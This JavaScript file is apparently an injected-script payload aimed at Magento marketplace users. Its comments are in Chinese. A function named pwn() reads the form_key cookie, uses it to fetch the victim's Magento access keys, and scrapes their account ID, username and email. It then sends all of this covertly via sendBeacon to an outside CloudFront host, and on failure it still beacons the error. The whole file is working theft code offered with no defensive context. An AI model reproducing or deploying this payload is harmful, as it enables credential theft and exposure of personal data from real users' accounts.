(function() {
    const EC2_URL = "https://d2sp0p7hm253bi.cloudfront.net/ccc?"; // 建议使用 HTTPS

    async function pwn() {
        let results = { url: window.location.href };

        try {
            // 1. 获取 form_key (Magento 2 必需)
            const fKey = (`; ${document.cookie}`.split(`; form_key=`).pop() || "").split(';').shift();

            // 2. 获取 Access Keys (POST)
            const resKeys = await fetch('/customer/accesskeys/getAccessKeys/platform/magento_2', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `formKey=${fKey}`
            });
            results.access_keys = await resKeys.text();

            // 3. 获取 User Info (GET)
            const resInfo = await fetch('/customer/account/edit/');
            const html = await resInfo.text();
            
            // 使用正则提取，比 DOMParser 更轻量且不依赖页面标签
            results.mage_id = (html.match(/id="mage_account_id"[\s\S]*?>\s*([\w]+)/) || [])[1];
            results.username = (html.match(/id="screen_name"[\s\S]*?>\s*([\w]+)/) || [])[1];
            results.email = (html.match(/id="email"[\s\S]*?>\s*([\w\.\@\-]+)/) || [])[1];

            // 4. 发送给 EC2 (使用 sendBeacon 避免跨域且更隐蔽)
            const blob = new Blob([JSON.stringify(results)], {type: 'application/json'});
            navigator.sendBeacon(EC2_URL, blob);

        } catch (e) {
            // 即使失败也尝试发送错误信息
            navigator.sendBeacon(EC2_URL, JSON.stringify({error: e.message}));
        }
    }

    pwn();
})();
